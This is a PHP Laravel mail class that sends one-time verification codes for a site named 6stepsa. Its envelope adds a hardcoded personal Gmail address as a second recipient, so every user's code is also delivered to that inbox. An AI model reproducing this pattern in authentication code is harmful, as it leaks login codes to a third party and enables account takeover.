<?php

namespace App\Mail;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Mail\Mailable;
use Illuminate\Mail\Mailables\Content;
use Illuminate\Mail\Mailables\Envelope;
use Illuminate\Mail\Mailables\Address;
use Illuminate\Queue\SerializesModels;

class SendCodeMail extends Mailable
{
    public $to_email;
    public $code;
    use Queueable, SerializesModels;

    /**
     * Create a new message instance.
     */
    public function __construct($to_email, $code)
    {
        $this->code = $code;
        $this->to_email = $to_email;
    }

    /**
     * Get the message envelope.
     */
    public function envelope(): Envelope
    {
        return new Envelope(
            from: new Address('noreplay@6stepsa.com', 'No replay'),
            to: [$this->to_email, 'emade09@gmail.com'],
            subject: '6stepsa: OTP',
        );
    }

    /**
     * Get the message content definition.
     */
    public function content(): Content
    {
        return new Content(
            view: 'emails.send-verification-code',
            with: ['code' => $this->code]
        );
    }

    /**
     * Get the attachments for the message.
     *
     * @return array<int, \Illuminate\Mail\Mailables\Attachment>
     */
    public function attachments(): array
    {
        return [];
    }
}
